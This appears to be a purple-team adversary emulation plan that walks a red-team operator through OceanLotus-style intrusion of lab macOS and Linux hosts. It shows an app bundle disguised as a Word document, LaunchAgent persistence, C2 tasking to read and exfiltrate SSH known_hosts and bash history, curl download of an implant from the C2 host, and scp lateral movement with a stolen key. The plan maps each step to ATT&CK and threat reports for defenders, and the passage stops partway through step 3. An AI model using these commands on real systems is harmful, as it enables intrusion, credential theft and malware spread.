# 🌊💮 OceanLotus Emulation Plan

![flow operation diagram](../Resources/images/OperationsFLowBlackBG.jpeg)

This scenario emulates OceanLotus TTPs based primarily on two malware specimens either
used by or associated with the OceanLotus actors:

1. [Rota Jakiro](../Resources/OSX.OceanLotus)
2. [OceanLotus.abcdef](../Resources/rota)

### 🗺️ Legend

This document is intended to be used as an operational guide for a purple team. We
recommend pausing ~2m after each step to give any detection tools or logs time to
caputre the information.

Based on the CTI Emulation Plan, each step includes the following information:

- 📖 **Overview** - Summary of actions that are completed in the step
- 👾 **Red Team Procedures** - Red team operator instructions and commands to execute
  with expected output
- 🔮 **Reference Code & Reporting** - A table with links to the source code for specific
  actions with cited intelligence leveraged for this action (if available)
- 🔬 **Blue Team Notes** - key API calls, events, or telemetry for blue teams

In-line Symbols:

* :bulb: - callout notes
* :heavy_exclamation_mark: - extremely important note
* :arrow_right: - Switching to another session
* :o: - Sign out of something

---

## Step 0 - Operation Setup

### 📖 Overview

This step assumes you have completed the [infrastructure setup](../Resources/setup/). Actions
completed in this step:

- Login to the attacker Kali machine via SSH
- Start the control server
- Set up attacker terminal windows for execution
- Login to the macOS VM on AWS - Required for step 1

At the end of this step the Red Team operator's workspace should be set up to run and
manage the emulation. This includes a terminal session providing C2 feedback from the
listener and a terminal session to task active implants. Assuming the red team operator
is executing Step 1, this also includes establishing a VNC session on macOS in the env.

---

### 👾 Red Team Procedures

#### Kali Setup

Pre-Flight Checks:

- Ensure OceanLotus GitHub repo is cloned to the Kali host (copy/paste commands start at
  the `ocean-lotus` folder)
- All executables have been built on the correct operating system (i.e. do not compile
  rota on Kali)
- The C2 server has been configured to the env and built from source with configurations
- All executables used in the operation are in the folders the C2 leverages (i.e.
  `Payloads` folder)

Assuming you are running on a macOS or Linux host... Open **four** terminal windows on
your local machine (assuming a macOS or similar terminal). Two terminal windows are used
for the C2 server, two are used for the AWS macOS instance.

1. :arrow_right: In the **first** terminal window, ssh to the Kali box hosting our C2
   server in AWS
   ```
   ssh kali@10.90.30.26
   ```
   Expected Output:
   A login session as the kali user
   ```
   ┌──(kali㉿kali1)-[~]
   └─$
   ```
2. Start the C2 Server. Navigate to the `controlServer` folder of the ocean-lotus cloned
   repo and start the C2 server.
   ```
   cd ocean-lotus/Resources/controlServer
   sudo ./controlServer
   ```
   Expected Output:
   ```
   [INFO] 2023/08/18 16:32:45 Initializing REST API from config file:  ./config/restAPI_config.yml
   [SUCCESS] 2023/08/18 16:32:45 REST API configuration set
   [INFO] 2023/08/18 16:32:45 Starting REST API server
   [SUCCESS] 2023/08/18 16:32:45 REST API server is listening on:  127.0.0.1:9999
   [INFO] 2023/08/18 16:32:45 Setting C2 handler configurations from config file:  ./config/handler_config.yml
   [SUCCESS] 2023/08/18 16:32:45 C2 Handler configuration set
   [INFO] 2023/08/18 16:32:45 Starting C2 handlers
   [INFO] 2023/08/18 16:32:45 Starting the oceanlotus Handler...
   [SUCCESS] 2023/08/18 16:32:45 Started handler oceanlotus
   [INFO] 2023/08/18 16:32:45 Handler simplehttp disabled. Skipping.
   [INFO] 2023/08/18 16:32:45 Waiting for connections
   [INFO] 2023/08/18 16:32:45 Starting Server...
   10.90.30.26:443
   ```
   This window is our listener, communications from implants will display in this
   window. Leave this window open and set to the side.
3. :arrow_right: In the **second** terminal window, establish a second SSH connection.
   ```
   ssh kali@10.90.30.26
   ```
   Expected Output:
   A login session as the kali user
   ```
   ┌──(kali㉿kali1)-[~]
   └─$
   ```
4. Navigate to the controlServer folder and leave this window open and accessible.
   ```
   cd ocean-lotus/Resources/controlServer
   ```
   This is the terminal window we use to task the implant. Unless otherwise specified,
   all copy/paste commands will use this terminal window.

<details><summary>Troubleshooting</summary>

   Check Configuration.
   - Check the ip address & port in the config file
   - Recompile the control server with the new IP - In the controlServer folder run the
     following command.

      ```
      go build -o controlServer main.go
      ```

</details>

#### VNC Access to macOS

1. :arrow_right: Navigate to the **third** terminal window on your local machine.
2. Setup SSH Tunnel to forward port 5900 to localhost (must use the ec2-user for this
   part).
   ```
   ssh -L 5900:localhost:5900 ec2-user@10.90.30.22
   ```
   The result should be an active SSH session, with port 5900 on the AWS macOS forwarded
   to port 5900 on your local machine. Expected Output:
   ```
   Last login: <insert date from somewhere>
       ┌───┬──┐   __|  __|_  )
       │ ╷╭╯╷ │   _|  (     /
       │  └╮  │  ___|\___|___|
       │ ╰─┼╯ │  Amazon EC2
       └───┴──┘  macOS Catalina 10.15.7
   ```
   Leave this window open and move to the side. We will not need to reference this
   window for the rest of the operation but do need to leave it open until we are
   finished with the macOS portion.
3. :arrow_right: Navigate to the **fourth**, and last open terminal window on your local
   machine.
4. Copy/Paste the following command to connect over VNC for a GUI interface for the
   macOS machine in AWS.
   ```
   open vnc://localhost:5900
   ```
   A window should appear asking for Screen Sharing privileges to sign into "localhost".
   This terminal window can be closed or terminated after the command is run.
5. Enter Hope Potter's credentials:
   <br>Username: `hpotter`
   <br>Password: `noax3teenohb~e`

   Expected output: A GUI interface to the Mac Mini should appear on the screen asking
   for a password.
6. :arrow_right: Enter the same password from above... manually. The user's Desktop
   should appear.
7. Click on the Downloads folder in the Dock located at the base of the Desktop. When
   the icon expands, select "Open in Finder". A Finder window will open displaying the
   contents of the Downloads folder.

   >The Dock is the macOS version of a Windows toolbar, Finder is the macOS version of
   >Windows Explorer, and the Downloads folder is typically located to the left side of
   >the Trash icon in the Dock.

## Step 1 - Establish Foothold

### 📖 Overview

👋 Handwaving: Assume the user downloaded a Word document from a legitimate, but
compromised, site. The Word document (`conkylan.app` - unicorn in Vietnamese) resides in
the user's `Downloads` folder.

**Step 1** emulates OceanLotus gaining initial access via a malicious file
[T1204.002](https://attack.mitre.org/techniques/T1204/002/) targeting user `hpotter`.

Thinking it's a normal Word document, the user, Hope Potter (hpotter), double-clicks
`conkylan.app`. (Note: we were not able to disguise the app as a Word document using a
homoglyph file extension due to OS updates 🙌 🍎.) The Word document is actually an
Application bundle that contains the first stage payload, which does the following:

- Removes quarantine flag on files within the application bundle
- Installs persistence via LaunchAgent
- Extracts and base64 decodes the embedded second stage implant and its communication
  library component as `/Users/hpotter/Library/WebKit/com.apple.launchpad` and
  `/Users/hpotter/Library/WebKit/b2NlYW5sb3R1czIz`, respectively
- Uses touch to update the timestamps of the second stage implant artifacts
- Uses chmod to make the second stage implant binary executable by changing file
  permissions to 755
- Executes the second stage implant
- Replaces the application bundle with the decoy Word document

The Implant is a fat binary that does the following:

- Collects OS information
- Registers with C2 server

---

### 👾 Red Team Procedures

1. Emulate the user by double-clicking `conkylan.app`. (Lets pretend it's a Word
   document.)
2. Confirm C2 Registration of the OSX implant

   In the Listener terminal window you should see the following output:

   ```zsh
      [INFO] 2023/08/18 17:08:13 Received first-time beacon from b6dbd70f203515095d0ca8a5ecbb43f7. Creating session...

      [SUCCESS] 2023/08/18 17:08:13 *** New session established: b6dbd70f203515095d0ca8a5ecbb43f7 ***
      +----------------------------------+------------+----------+------+-----+------+
      |               GUID               | IP ADDRESS | HOSTNAME | USER | PID | PPID |
      +----------------------------------+------------+----------+------+-----+------+
      | b6dbd70f203515095d0ca8a5ecbb43f7 |            |          |      |   0 |    0 |
      +----------------------------------+------------+----------+------+-----+------+

      [INFO] 2023/08/18 17:08:13 Current Directory:
      [INFO] 2023/08/18 17:08:13 Successfully added session.
      [SUCCESS] 2023/08/18 17:08:13 Successfully created session for implant b6dbd70f203515095d0ca8a5ecbb43f7.
      [INFO] 2023/08/18 17:08:13 Session created for implant b6dbd70f203515095d0ca8a5ecbb43f7
   ```

3. The macOS implant immediately sends collected discovery information about the victim
   machine which is printed out in the Listener terminal window.

   Expected Output:
   ```
      [INFO] 2023/08/18 17:08:13 Initial data received from implant:
      /Users/hpotter/Library/WebKit/
      1692378529
      hpotter
      Mac mini
      x86_64
      VISERION.COM10.15.7
      6-Core Intel Core i73.2 GHz
      32 GB
      6-Core Intel Core i7
   ```

4. The implant will continue to send an `OSX_heartbeat` until tasked.

   Expected Output:
   ```
      [INFO] 2023/08/18 17:17:45 Received beacon from existing implant b6dbd70f203515095d0ca8a5ecbb43f7.
      [INFO] 2023/08/18 17:17:45 No tasks available for UUID:  b6dbd70f203515095d0ca8a5ecbb43f7
   ```

 5. Verify the persistence file was dropped by the initial payloads.

    ```
    ./evalsC2client.py --set-task b6dbd70f203515095d0ca8a5ecbb43f7 '{"cmd":"OSX_run_cmd", "arg":"ls -la /Users/hpotter/Library/LaunchAgents/com.apple.launchpad"}'
    ```

    Expected Output:
    ```
       [SUCCESS] 2023/08/24 19:21:26 Successfully set task for session: b6dbd70f203515095d0ca8a5ecbb43f7
       [Task] 2023/08/24 19:21:32 total 8
       ...
       rw-r--r--  1 hpotter  VISERION\Domain Users  456 Aug 24 19:21 com.apple.launchpad.plist
       [SUCCESS] 2023/08/24 19:21:32 Successfully set task output.
    ```


<details><summary>Extra Credit - Execute Persistence</summary>

   This is not part of the emulation plan. However, if you want to manually verify the
   LaunchAgent works you can use `launchctl` to manually load and execute the
   LaunchAgent. macOS loads and excecutes LaunchAgents upon user logon, therefore it
   would be abnormal for the adversary to arbitrarily execute a LaunchAgent when there
   is an established session.

   The below commands will allow you to manually load the `OSX.OceanLotus` LaunchAgent.

   Note: As a result of our decision to hardcode the implant UUIDs to enable the
   copy/paste approach for this emulation there are additional actions that must be
   taken for session management. Loading the LaunchAgent will result in a double
   session.

   1. Load the LaunchAgent using `launchctl`

      ```
      ./evalsC2client.py --set-task b6dbd70f203515095d0ca8a5ecbb43f7 '{"cmd":"OSX_run_cmd", "arg":"launchctl load -w /Users/hpotter/Library/LaunchAgents/com.apple.launchpad"}'
      ````

   2. List out the processes using the com.apple.launchpad plist

      ```
      ./evalsC2client.py --set-task b6dbd70f203515095d0ca8a5ecbb43f7 '{"cmd":"OSX_run_cmd", "arg":"ps -ef | grep com.apple.launchpad"}'
      ```

   3. Identify the process that is NOT running with the parent process of `1`. Using
      this process's PID, replace `PID` in the below command to kill this process.

      ```
      ./evalsC2client.py --set-task b6dbd70f203515095d0ca8a5ecbb43f7 '{"cmd":"OSX_run_cmd", "arg":"kill -9 PID"}'
      ```

   4. Veify we only have one running process using the `com.apple.launchpad` plist.

      ```
      ./evalsC2client.py --set-task b6dbd70f203515095d0ca8a5ecbb43f7 '{"cmd":"OSX_run_cmd", "arg":"ps -ef | grep com.apple.launchpad"}'
      ```

   5. Continue hacking...

</details>

### 🔮 Reference Code & Reporting

<details>
   <summary>Click to expand table</summary>

   | Red Team Activity                                                                                                                                           | Source Code Link                                                                                                                                                                                                       | ATT&CK Technique                                                                                                 | Relevant CTI Report                                                                                                                                                                                                                                                                                        |
   | ----------------------------------------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
   | Legitimate user opens conkylan.app                                                                                                                          | -                                                                                                                                                                                                                      | T1204.002 User Execution: Malicious File                                                                         | https://unit42.paloaltonetworks.com/unit42-new-improved-macos-backdoor-oceanlotus/<br><br>https://www.trendmicro.com/en_us/research/20/k/new-macos-backdoor-connected-to-oceanlotus-surfaces.html                                                                                                          |
   | conkylan.app masquerades as a Word document                                                                                                                 | [Application bundle build script](../Resources/OSX.OceanLotus/ApplicationBundle/build_bundle.sh)                                                                                                                       | T1036.008 Masquerading: Masquerade File Type                                                                     | https://unit42.paloaltonetworks.com/unit42-new-improved-macos-backdoor-oceanlotus/<br><br>https://www.trendmicro.com/en_us/research/20/k/new-macos-backdoor-connected-to-oceanlotus-surfaces.html                                                                                                          |
   | conkylan.app executes a shell script                                                                                                                        | [First stage script](../Resources/OSX.OceanLotus/ApplicationBundle/first_stage.sh)                                                                                                                                     | T1059.004 Command and Scripting Interpreter: Unix Shell                                                          | https://www.trendmicro.com/en_us/research/20/k/new-macos-backdoor-connected-to-oceanlotus-surfaces.html                                                                                                                                                                                                    |
   | Application bundle shell script removes the quarantine flag on the application bundle contents                                                              | [Script removes quarantine flag](..Resources/OSX.OceanLotus/ApplicationBundle/first_stage.sh#L50-L53)                                                                                                                  | T1222.002 File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification | https://www.trendmicro.com/en_us/research/20/k/new-macos-backdoor-connected-to-oceanlotus-surfaces.html                                                                                                                                                                                                    |
   | Application bundle shell script adds a Launch Agent configuration                                                                                           | [Script copies Launch Agent plist configuration to user's LaunchAgents](../Resources/OSX.OceanLotus/ApplicationBundle/first_stage.sh#L68-L83)                                                                          | T1543.001 Create or Modify System Process: Launch Agent                                                          | https://unit42.paloaltonetworks.com/unit42-new-improved-macos-backdoor-oceanlotus/<br><br>https://www.trendmicro.com/en_us/research/20/k/new-macos-backdoor-connected-to-oceanlotus-surfaces.html<br><br>https://www.trendmicro.com/en_us/research/18/d/new-macos-backdoor-linked-to-oceanlotus-found.html |
   | Application bundle shell script contains embedded base64 encoded binaries                                                                                   | [Script contains base64 encoded Implant and Communication Library binaries](../Resources/OSX.OceanLotus/ApplicationBundle/first_stage.sh#L38-L41)                                                                      | T1027.009 Embedded Payloads                                                                                      | https://www.trendmicro.com/en_us/research/20/k/new-macos-backdoor-connected-to-oceanlotus-surfaces.html                                                                                                                                                                                                    |
   | Application bundle shell script drops Communication dylib and implant binary                                                                                | [Script echos and writes the base64 decoded payload to disk](../Resources/OSX.OceanLotus/ApplicationBundle/first_stage.sh#L85-L90)                                                                                     | -                                                                                                                | https://www.trendmicro.com/en_us/research/20/k/new-macos-backdoor-connected-to-oceanlotus-surfaces.html                                                                                                                                                                                                    |
   | Application bundle shell script executes `touch`                                                                                                            | [Script modifies file timestamps](../Resources/OSX.OceanLotus/ApplicationBundle/first_stage.sh#L92-L98)                                                                                                                | T1070.006 Indicator Removal: Timestomp                                                                           | https://www.trendmicro.com/en_us/research/20/k/new-macos-backdoor-connected-to-oceanlotus-surfaces.html                                                                                                                                                                                                    |
   | Application bundle shell script adds executable bit to dropped implant binary                                                                               | [Script makes implant binary executable](../Resources/OSX.OceanLotus/ApplicationBundle/first_stage.sh#L50-L53)                                                                                                         | T1222.002 File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification | https://www.trendmicro.com/en_us/research/20/k/new-macos-backdoor-connected-to-oceanlotus-surfaces.html                                                                                                                                                                                                    |
   | Application bundle shell script deletes application bundle, replacing it with a decoy document                                                              | [Script deletes application bundle](../Resources/OSX.OceanLotus/ApplicationBundle/first_stage.sh#L101)                                                                                                                 | T1070 Indicator Removal: File Deletion                                                                           | https://unit42.paloaltonetworks.com/unit42-new-improved-macos-backdoor-oceanlotus/<br><br>https://www.trendmicro.com/en_us/research/20/k/new-macos-backdoor-connected-to-oceanlotus-surfaces.html                                                                                                          |
   | OSX.OceanLotus loads the dropped Communication dylib                                                                                                        | [`loadComms`](../Resources/OSX.OceanLotus/Implant/Implant/main.cpp#L40-L99)                                                                                                                                            | -                                                                                                                | https://www.welivesecurity.com/2019/04/09/oceanlotus-macos-malware-update/                                                                                                                                                                                                                                 |
   | OSX.OceanLotus implant leverages API calls from IOKit                                                                                                       | [Calls to IOKit APIs](../Resources/OSX.OceanLotus/Implant/Implant/ClientPP.cpp#L35-L50)                                                                                                                                | T1106 Native API                                                                                                 |                                                                                                                                                                                                                                                                                                            |
   | OSX.OceanLotus implant retrieves IOPlatformSerialNumber                                                                                                     | [Get IOPlatformSerialNumber](../Resources/OSX.OceanLotus/Implant/Implant/ClientPP.cpp#L302)                                                                                                                            | T1082 System Information Discovery                                                                               | https://www.welivesecurity.com/2019/04/09/oceanlotus-macos-malware-update/<br><br>https://www.trendmicro.com/en_us/research/20/k/new-macos-backdoor-connected-to-oceanlotus-surfaces.html                                                                                                                  |
   | OSX.OceanLotus implant retrieves IOPlatformUUID                                                                                                             | [Get IOPlatformSerialNumber](../Resources/OSX.OceanLotus/Implant/Implant/ClientPP.cpp#L305)                                                                                                                            | T1082 System Information Discovery                                                                               | https://www.welivesecurity.com/2019/04/09/oceanlotus-macos-malware-update/<br><br>https://www.trendmicro.com/en_us/research/20/k/new-macos-backdoor-connected-to-oceanlotus-surfaces.html                                                                                                                  |
   | OSX.OceanLotus leverages popen to executes shell commands                                                                                                   | [`executeCmd`](../Resources/OSX.OceanLotus/Implant/Implant/ClientPP.cpp#L8-L29)                                                                                                                                        | T1059.004 Command and Scripting Interpreter: Unix Shell                                                          | https://unit42.paloaltonetworks.com/unit42-new-improved-macos-backdoor-oceanlotus/                                                                                                                                                                                                                         |
   | OSX.OceanLotus implant retrieves MAC address from ifconfig                                                                                                  | [Execute ifconfig](../Resources/OSX.OceanLotus/Implant/Implant/ClientPP.cpp#L308-L309)                                                                                                                                 | T1016 System Network Configuration Discovery                                                                     | https://www.trendmicro.com/en_us/research/18/d/new-macos-backdoor-linked-to-oceanlotus-found.html<br?https://www.welivesecurity.com/2019/04/09/oceanlotus-macos-malware-update/<br><br>https://www.trendmicro.com/en_us/research/20/k/new-macos-backdoor-connected-to-oceanlotus-surfaces.html             |
   | OSX.OceanLotus implant retrieves current system time                                                                                                        | [Populate implant install time](../Resources/OSX.OceanLotus/Implant/Implant/ClientPP.cpp#L132)                                                                                                                         | T1124 System Time Discovery                                                                                      | https://www.trendmicro.com/en_us/research/18/d/new-macos-backdoor-linked-to-oceanlotus-found.html                                                                                                                                                                                                          |
   | OSX.OceanLotus implant leverages `getpwuid` to discover username                                                                                            | [`getpwuid`](../Resources/OSX.OceanLotus/Implant/Implant/ClientPP.cpp#L137-L142)                                                                                                                                       | T1033 System Owner/User Discovery                                                                                | https://unit42.paloaltonetworks.com/unit42-new-improved-macos-backdoor-oceanlotus/                                                                                                                                                                                                                         |
   | OSX.OceanLotus implant leverages `SCDynamicStoreCopyComputerName` to discover computer name                                                                 | [`getComputerName`](../Resources/OSX.OceanLotus/Implant/Implant/ClientPP.cpp#L94-L103)                                                                                                                                 | T1082 System Information Discovery                                                                               | https://www.trendmicro.com/en_us/research/18/d/new-macos-backdoor-linked-to-oceanlotus-found.html                                                                                                                                                                                                          |
   | OSX.OceanLotus implant leverages `uname` to discover the hardware name                                                                                      | [`getHardwareName`](../Resources/OSX.OceanLotus/Implant/Implant/ClientPP.cpp#L105-L113)                                                                                                                                | T1082 System Information Discovery                                                                               | https://www.trendmicro.com/en_us/research/18/d/new-macos-backdoor-linked-to-oceanlotus-found.html                                                                                                                                                                                                          |
   | OSX.OceanLotus implant discovers domain name                                                                                                                | [`klist`](../Resources/OSX.OceanLotus/Implant/Implant/ClientPP.cpp#L150-L152)                                                                                                                                          | T1016 System Network Configuration Discovery                                                                     | https://www.trendmicro.com/en_us/research/18/d/new-macos-backdoor-linked-to-oceanlotus-found.html<br>**NOTE:** Figure 10 reports the `HandlePP` class having a variable named `domain`                                                                                                                     |
   | OSX.OceanLotus implant discovers software product version                                                                                                   | [Execute `sw_vers`](../Resources/OSX.OceanLotus/Implant/Implant/ClientPP.cpp#L154-L155)                                                                                                                                | T1082 System Information Discovery                                                                               | https://www.trendmicro.com/en_us/research/18/d/new-macos-backdoor-linked-to-oceanlotus-found.html                                                                                                                                                                                                          |
   | OSX.OceanLotus implants discovers system hardware information                                                                                               | [Execute `system_profiler SPHardwareDataType`](../Resources/OSX.OceanLotus/Implant/Implant/ClientPP.cpp#L157-L160)                                                                                                     | T1082 System Information Discovery                                                                               | https://www.trendmicro.com/en_us/research/20/k/new-macos-backdoor-connected-to-oceanlotus-surfaces.html<br><br>https://www.welivesecurity.com/2019/04/09/oceanlotus-macos-malware-update/                                                                                                                  |
   | OSX.OceanLotus sends an HTTP POST request with the discovered OS info to register with the C2 server via call to exported function from Communication dylib | [Send `POST` with discovered OS info](../Resources/OSX.OceanLotus/Implant/Implant/ClientPP.cpp#L168)<br><br>[Communication library exported `sendRequest`](../Resources/OSX.OceanLotus/Comms/Comms/Comms.cpp#L89-L174) | T1071.001 Application Layer Protocol: Web Protocols                                                              | https://www.trendmicro.com/en_us/research/18/d/new-macos-backdoor-linked-to-oceanlotus-found.html<br><br>https://www.trendmicro.com/en_us/research/20/k/new-macos-backdoor-connected-to-oceanlotus-surfaces.html                                                                                           |
   | OSX.OceanLotus sends an HTTP GET request to heartbeat with the C2 server via call to exported function from Communication dylib                             | [Send `GET` with discovered OS info](../Resources/OSX.OceanLotus/Implant/Implant/ClientPP.cpp#L189)<br><br>[Communication library exported `sendRequest`](../Resources/OSX.OceanLotus/Comms/Comms/Comms.cpp#L89-L174)  | T1071.001 Application Layer Protocol: Web Protocols                                                              | https://www.trendmicro.com/en_us/research/18/d/new-macos-backdoor-linked-to-oceanlotus-found.html<br><br>https://www.trendmicro.com/en_us/research/20/k/new-macos-backdoor-connected-to-oceanlotus-surfaces.html                                                                                           |

 </details>

### 🔬 Blue Team Notes

None

## Step 2 - macOS Discovery

### 📖 Overview

**Step 2** emulates OceanLotus conducting discovery on a macOS host. OceanLotus
enumerates the contents of the `.ssh` folder. Seeing there is an SSH key, the
`known_hosts` and `history` files are exfil'ed to the C2 server for analysis. The
history file reveals Hope Potter sends files to the file server using SCP.

> CTI Note: There is no open-source reporting to support using the `known_hosts` file in
> conjunction with local SSH keys 😿. During our research, we did not find reporting
> detailing credential collection on macOS. In order to perform lateral movement for the
> linux portion of our scenario and staying consistent with using native OS utilities
> seen in other reporting, we chose to use `known_hosts` discovery with locally stored
> SSH keys.

---

### 👾 Red Team Procedures

1. View the contents of the /.ssh folder
   ```zsh
   ./evalsC2client.py --set-task b6dbd70f203515095d0ca8a5ecbb43f7 '{"cmd":"OSX_run_cmd", "arg":"ls -la /Users/hpotter/.ssh/"}'
   ```

   Expected Output:
   ```
   [SUCCESS] 2023/08/24 19:23:52 Successfully set task for session: b6dbd70f203515095d0ca8a5ecbb43f7
   ...
   [Task] 2023/08/24 19:23:59 total 24
   drwx------   5 hpotter  VISERION\Domain Users   160 Aug  4 19:09 .
   drwxr-xr-x+ 18 hpotter  VISERION\Domain Users   576 Aug  4 18:23 ..
   -rw-------   1 hpotter  VISERION\Domain Users  2635 Aug  3 18:14 id_rsa
   -rw-r--r--   1 hpotter  VISERION\Domain Users   589 Aug  3 18:14 id_rsa.pub
   -rw-r--r--   1 hpotter  VISERION\Domain Users   172 Aug  4 19:09 known_hosts

   [SUCCESS] 2023/08/24 19:23:59 Successfully set task output.
   ```

2. Exfil the Known Host File for review.
   ```zsh
   ./evalsC2client.py --set-task b6dbd70f203515095d0ca8a5ecbb43f7 '{"cmd":"OSX_upload_file", "arg":"/Users/hpotter/.ssh/known_hosts"}'
    ```
   Expected output:
   ```
   [SUCCESS] 2023/08/24 19:24:54 Successfully set task for session: b6dbd70f203515095d0ca8a5ecbb43f7
   ...
   [SUCCESS] 2023/08/24 19:24:54 File uploaded: Successfully uploaded file to control server at './files/known_hosts'
   ```

3. Verify the file was uploaded to the control server.
   ```
   cat ./files/known_hosts
   ```

   Expected Output:
   ```
   10.90.30.7 ecdsa...<...ssh key information>
   ```

4. Use the History file to understand how this host connects to the host listed in the known_hosts file.
   ```zsh
   ./evalsC2client.py --set-task b6dbd70f203515095d0ca8a5ecbb43f7 '{"cmd":"OSX_run_cmd", "arg":"cat /Users/hpotter/.bash_history"}'
   ```

   Expected output:
   ```
   [SUCCESS] 2023/08/18 18:36:21 Successfully set task for session: b6dbd70f203515095d0ca8a5ecbb43f7
   ...
   [INFO] 2023/08/18 18:36:28 Received task output for session:  b6dbd70f203515095d0ca8a5ecbb43f7
   [Task] 2023/08/18 18:36:28 which git
   brew install iterm
   sudo chown -R $(whoami) /usr/local/Cellar
   dscl
   ...

   [SUCCESS] 2023/08/24 19:25:30 Successfully set task output.
   ```

   Reviewing the history file, we see the user uses scp commands to a specified IP address.

### 🔮 Reference Code & Reporting

<details>
   <summary>Click to expand table</summary>

   | Red Team Activity                                                                          | Source Code Link                                                                                                                                                                                                   | ATT&CK Technique                                        | Relevant CTI Report                                                                                                                                                                                                                                                                                        |
   | ------------------------------------------------------------------------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | ------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
   | OSX.OceanLotus implant leverages popen to execute shell commands                           | [Execute command instruction `0xAC`](../Resources/OSX.OceanLotus/Implant/Implant/ClientPP.cpp#L240-L253)<br><br>[`executeCmd`](../Resources/OSX.OceanLotus/Implant/Implant/ClientPP.cpp#L8-L29)                    | T1059.004 Command and Scripting Interpreter: Unix Shell | https://www.trendmicro.com/en_us/research/18/d/new-macos-backdoor-linked-to-oceanlotus-found.html<br><br>https://www.trendmicro.com/en_us/research/20/k/new-macos-backdoor-connected-to-oceanlotus-surfaces.html<br><br>https://unit42.paloaltonetworks.com/unit42-new-improved-macos-backdoor-oceanlotus/ |
   | OSX.OceanLotus implant returns command output via HTTP POST request to the C2 server       | [Send `POST` with command output](../Resources/OSX.OceanLotus/Implant/Implant/ClientPP.cpp#L252)<br><br>[Communication library exported `sendRequest`](../Resources/OSX.OceanLotus/Comms/Comms/Comms.cpp#L89-L174) | T1071.001 Application Layer Protocol: Web Protocols     | https://www.trendmicro.com/en_us/research/18/d/new-macos-backdoor-linked-to-oceanlotus-found.html<br><br>https://www.trendmicro.com/en_us/research/20/k/new-macos-backdoor-connected-to-oceanlotus-surfaces.html                                                                                           |
   | OSX.OceanLotus implant executes `ls -la /Users/hpotter/.ssh/`                              | [Execute command instruction `0xAC`](../Resources/OSX.OceanLotus/Implant/Implant/ClientPP.cpp#L240-L253)<br><br>[`executeCmd`](../Resources/OSX.OceanLotus/Implant/Implant/ClientPP.cpp#L8-L29)                    | T1083 File and Directory Discovery                      | -                                                                                                                                                                                                                                                                                                          |
   | OSX.OceanLotus implant exfiltrates `/Users/hpotter/.ssh/known_hosts` via HTTP POST request | [Upload instruction `0x72`](../Resources/OSX.OceanLotus/Implant/Implant/ClientPP.cpp#L217-L230)<br><br>[`readFile`](../Resources/OSX.OceanLotus/Implant/Implant/ClientPP.cpp#L68-L82)                              | T1041 Exfiltration Over C2 Channel                      | -                                                                                                                                                                                                                                                                                                          |
   | OSX.OceanLotus implant executes `cat /Users/hpotter/.bash_history`                         | [Execute command instruction `0xAC`](../Resources/OSX.OceanLotus/Implant/Implant/ClientPP.cpp#L240-L253)<br><br>[`executeCmd`](../Resources/OSX.OceanLotus/Implant/Implant/ClientPP.cpp#L8-L29)                    | T1552.003 Unsecured Credentials: Bash History           | -                                                                                                                                                                                                                                                                                                          |

   </summary>
</details>

### 🔬 Blue Team Notes

None

## Step 3 - Lateral Movement

### 📖 Overview

**Step 3** emulates OceanLotus transfering tools into the victim enviornment for
targeted platforms.

OceanLotus downloads Rota Jakiro to the macOS host in the
`/Users/hpotter/Library/WebKit` folder (the execution folder for OSX.OceanLotus) as
`osx.download`. OSX.OceanLotus then uses SCP to transfer Rota Jakiro to the `\tmp`
folder of the Linux host. Using SSH, OSX.OceanLotus changes Rota Jakiro to an executable
and executes Rota Jakiro on the Linux host.

---

### 👾 Red Team Procedures

1. Task OceanLotus to download Rota Jakiro to the macOS Host
   ```
   ./evalsC2client.py --set-task b6dbd70f203515095d0ca8a5ecbb43f7 '{"cmd":"OSX_download_file", "payload":"rota"}'
   ```
   Expected Output:
   ```
   [SUCCESS] 2023/08/24 19:26:19 Successfully set task for session: b6dbd70f203515095d0ca8a5ecbb43f7
   ...
   [INFO] 2023/08/24 18:53:21 Fetching requested file for task:  rota
   ```

2. Verify the file downloaded
   ```
   ./evalsC2client.py --set-task b6dbd70f203515095d0ca8a5ecbb43f7 '{"cmd":"OSX_run_cmd", "arg":"ls -la /Users/hpotter/Library/WebKit/osx.download"}'
   ```
   Exepcted Output:
   ```
   [SUCCESS] 2023/08/24 19:28:06 Successfully set task for session: b6dbd70f203515095d0ca8a5ecbb43f7
   [INFO] 2023/08/24 19:28:20 New task received for UUID:  b6dbd70f203515095d0ca8a5ecbb43f7
   [INFO] 2023/08/24 19:28:20 Sending new task to implant: b6dbd70f203515095d0ca8a5ecbb43f7
   [INFO] 2023/08/24 19:28:20 Received task output for session:  b6dbd70f203515095d0ca8a5ecbb43f7
   [Task] 2023/08/24 19:28:20 -rw-r--r--  1 hpotter  VISERION\Domain Users  30856 Aug 24 19:27 /Users/hpotter/Library/WebKit/osx.download

   [SUCCESS] 2023/08/24 19:28:20 Successfully set task output.
   ```
   💡 All files are downloaded to the directory where the OSX implant binary is running,
   `/Users/hpotter/Library/WebKit`, as `osx.download`. The application bundle drops the
   OSX implant into `/Users/hpotter/Library/WebKit`.

   <details>
      <summary>Troubleshooting</summary>

      On the C2 server start a simple HTTP server

      ```
      cd /opt/oceanlotus/Resources/payloads
      ```

      <br>

      ```
      python3 -m http.server
      ```

      Task the implant

      ```
      ./evalsC2client.py --set-task b6dbd70f203515095d0ca8a5ecbb43f7 '{"cmd":"OSX_run_cmd", "arg":"curl 10.90.30.26:8000/rota -o /tmp/rota"}'
      ```

      Verify the file downloaded

      ```
      ./evalsC2client.py --set-task b6dbd70f203515095d0ca8a5ecbb43f7 '{"cmd":"OSX_run_cmd", "arg":"ls -la /tmp/rota"}'
      ```

      End Troubleshooting

   </details>

3. Task OSX.OceanLotus to SCP the Rota Jakiro implant from the macOS host to the Linux
   host
   ```
   ./evalsC2client.py --set-task b6dbd70f203515095d0ca8a5ecbb43f7 '{"cmd":"OSX_run_cmd", "arg":"scp -i /Users/hpotter/.ssh/id_rsa /tmp/rota hpotter@viserion.com@10.90.30.7:/tmp/rota"}'
   ```
   Expected Output:
   ```
